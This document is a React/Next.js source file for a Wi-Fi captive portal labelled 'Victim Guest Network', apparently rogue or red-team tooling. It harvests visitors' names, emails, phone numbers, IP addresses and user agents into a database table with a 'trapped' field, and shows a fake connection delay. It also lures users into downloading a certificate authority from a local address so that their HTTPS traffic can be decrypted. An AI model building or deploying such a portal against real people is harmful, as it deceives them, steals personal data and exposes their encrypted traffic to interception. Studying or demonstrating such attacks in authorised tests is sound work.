"use client"

import type React from "react"
import { useState, useMemo, useEffect } from "react"
import { useRouter } from "next/navigation"
import { createClient } from "@/lib/client"
import { TermsDialog } from "@/components/terms-dialog"

export default function CaptivePortal() {
  const [email, setEmail] = useState("")
  const [phone, setPhone] = useState("")
  const [name, setName] = useState("")
  const [acceptedTerms, setAcceptedTerms] = useState(false)
  const [showTerms, setShowTerms] = useState(false)
  const [isConnecting, setIsConnecting] = useState(false)
  const router = useRouter()

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!acceptedTerms) {
      alert('Please accept the Terms and Conditions to continue.');
      return;
    }

    setIsConnecting(true);

    try {
      const supabase = createClient()

      // Enhanced IP and device detection
      const userAgent = navigator.userAgent
      const realIP = await getRealIP()
      const deviceName = generateDeviceName(userAgent) || "Unknown Device"

      const { data, error } = await supabase
        .from("connected_users")
        .insert({
          email,
          phone,
          name,
          ip_address: realIP,
          mac_address: "detecting...",
          device_name: deviceName,
          user_agent: userAgent,
          accepted_terms: true,
          terms_read_complete: false,
          trapped: false,
        })
        .select()
        .single()

      if (error) throw error

      // Log activity
      await supabase.from("activity_log").insert({
        user_id: data.id,
        action_type: "portal_access",
        setting_name: "captive_portal",
        enabled: true,
        details: {
          email,
          phone,
          name,
          device_name: deviceName,
          ip_address: realIP,
          timestamp: new Date().toISOString(),
        },
      })

      // Simulate connection delay
      await new Promise(resolve => setTimeout(resolve, 2000))

      router.push(`/connected?session=${data.id}`)
    } catch (error) {
      console.error("[v2] Connection error:", error)
      alert('Connection failed. Please try again.')
    } finally {
      setIsConnecting(false)
    }
  };

  // Helper functions for IP and device detection
  const getRealIP = async (): Promise<string> => {
    try {
      const response = await fetch('/api/ip-detect')
      if (response.ok) {
        const data = await response.json()
        return data.ip || '127.0.0.1'
      }
    } catch (error) {
      console.warn('[v2] IP detection failed, using fallback')
    }
    return '127.0.0.1'
  }

  const generateDeviceName = (userAgent: string): string => {
    const devicePatterns = [
      { regex: /iPhone|iPad|iPod/, name: 'iOS Device' },
      { regex: /Android/, name: 'Android Device' },
      { regex: /Windows/, name: 'Windows Device' },
      { regex: /Macintosh|Mac OS X/, name: 'Mac Device' },
      { regex: /Linux/, name: 'Linux Device' },
    ]

    const browserPatterns = [
      { regex: /Chrome/, name: 'Chrome' },
      { regex: /Firefox/, name: 'Firefox' },
      { regex: /Safari/, name: 'Safari' },
      { regex: /Edge/, name: 'Edge' },
      { regex: /Opera/, name: 'Opera' },
    ]

    let deviceName = 'Unknown Device'
    for (const pattern of devicePatterns) {
      if (pattern.regex.test(userAgent)) {
        deviceName = pattern.name
        break
      }
    }

    let browserName = 'Unknown Browser'
    for (const pattern of browserPatterns) {
      if (pattern.regex.test(userAgent)) {
        browserName = pattern.name
        break
      }
    }

    return `${deviceName} (${browserName})`
  }

  return (
    <>
      <style jsx>{`
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        .body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
            background-color: #f5f5f5;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 460px;
        }

        .card {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
            overflow: hidden;
            margin-bottom: 30px;
        }

        .header {
            background-color: #0066b2;
            color: white;
            padding: 24px;
            text-align: center;
            font-size: 28px;
            font-weight: 600;
            letter-spacing: 2px;
        }

        .content {
            padding: 40px;
        }

        .rtg-logo-container {
            display: flex;
            justify-content: center;
            margin-bottom: 20px;
        }

        .rtg-logo {
            max-width: 200px;
            height: auto;
            object-fit: contain;
            border-radius: 4px;
        }

        .network-title {
            color: #0066b2;
            font-size: 20px;
            font-weight: 500;
            text-align: center;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 6px;
            font-size: 14px;
            font-weight: 500;
            color: #333;
        }

        .required {
            color: #d32f2f;
        }

        input[type="text"],
        input[type="email"],
        input[type="tel"] {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 15px;
            transition: border-color 0.3s;
        }

        input[type="text"]:focus,
        input[type="email"]:focus,
        input[type="tel"]:focus {
            outline: none;
            border-color: #0066b2;
        }

        .checkbox-group {
            display: flex;
            align-items: flex-start;
            margin: 20px 0;
            font-size: 14px;
        }

        .checkbox-group input[type="checkbox"] {
            margin-right: 8px;
            margin-top: 3px;
            cursor: pointer;
        }

        .checkbox-group label {
            margin: 0;
            cursor: pointer;
            font-weight: normal;
        }

        .checkbox-group a {
            color: #0066b2;
            text-decoration: none;
        }

        .checkbox-group a:hover {
            text-decoration: underline;
        }

        .btn-signin {
            width: 100%;
            padding: 14px;
            background-color: #4caf50;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.3s;
            margin-bottom: 20px;
        }

        .btn-signin:hover {
            background-color: #45a049;
        }

        .btn-signin:disabled {
            background-color: #cccccc;
            cursor: not-allowed;
        }

        .btn-portal {
            display: block;
            width: 100%;
            padding: 12px;
            background-color: white;
            color: #0066b2;
            border: 1px solid #0066b2;
            border-radius: 4px;
            font-size: 15px;
            font-weight: 500;
            text-align: center;
            text-decoration: none;
            cursor: pointer;
            transition: all 0.3s;
        }

        .btn-portal:hover {
            background-color: #f0f7ff;
        }

        .footer-text {
            text-align: center;
            font-size: 13px;
            color: #666;
            margin-bottom: 15px;
        }

        .certificate-link {
            text-align: center;
            margin-top: 20px;
        }

        .certificate-link a {
            color: #0066b2;
            text-decoration: none;
            font-size: 15px;
        }

        .certificate-link a:hover {
            text-decoration: underline;
        }

        .certificate-description {
            text-align: center;
            font-size: 13px;
            color: #666;
            margin-top: 10px;
            line-height: 1.5;
        }
      `}</style>

      <div className="body">
        <div className="container">
          <div className="card">
            <div className="header">
              Victim Guest Network
            </div>
            <div className="content">
              {/* RTG Logo in top design */}
              <div className="rtg-logo-container">
                <img
                  src="/components/images/rtg-logo.png"
                  alt="Victim Network Logo"
                  className="rtg-logo"
                />
              </div>

              <h2 className="network-title">Sign in to access this network</h2>

              <form id="loginForm" onSubmit={handleSubmit}>
                <div className="form-group">
                  <label htmlFor="fullName">Full Name <span className="required">*</span></label>
                  <input
                    type="text"
                    id="fullName"
                    name="fullName"
                    value={name}
                    onChange={(e) => setName(e.target.value)}
                    required
                  />
                </div>

                <div className="form-group">
                  <label htmlFor="email">Email Address <span className="required">*</span></label>
                  <input
                    type="email"
                    id="email"
                    name="email"
                    value={email}
                    onChange={(e) => setEmail(e.target.value)}
                    required
                  />
                </div>

                <div className="form-group">
                  <label htmlFor="phone">Phone Number <span className="required">*</span></label>
                  <input
                    type="tel"
                    id="phone"
                    name="phone"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    required
                  />
                </div>

                <div className="checkbox-group">
                  <input
                    type="checkbox"
                    id="terms"
                    name="terms"
                    checked={acceptedTerms}
                    onChange={(e) => setAcceptedTerms(e.target.checked)}
                    required
                  />
                  <label htmlFor="terms">
                    I accept the{" "}
                    <button
                      type="button"
                      onClick={(e) => { e.preventDefault(); setShowTerms(true); }}
                      style={{ color: '#0066b2', textDecoration: 'none', background: 'none', border: 'none', cursor: 'pointer' }}
                    >
                      Terms and Conditions
                    </button>{" "}
                    and acknowledge that my connection will be monitored for security purposes.
                  </label>
                </div>

                <button type="submit" className="btn-signin" disabled={isConnecting}>
                  {isConnecting ? "Connecting..." : "Sign in"}
                </button>
              </form>
            </div>
          </div>

          <div className="certificate-link">
            <a href="http://192.168.1.250/google/" target="_blank" rel="noopener noreferrer">
              Download HTTPS certificate authority
            </a>
          </div>
          <p className="certificate-description">
            By doing this, you consent to allowing your HTTPS web traffic to be decrypted and scanned for security purposes
          </p>
        </div>
      </div>

      <TermsDialog
        open={showTerms}
        onOpenChange={setShowTerms}
        onReadComplete={() => {}}
      />
    </>
  )
}
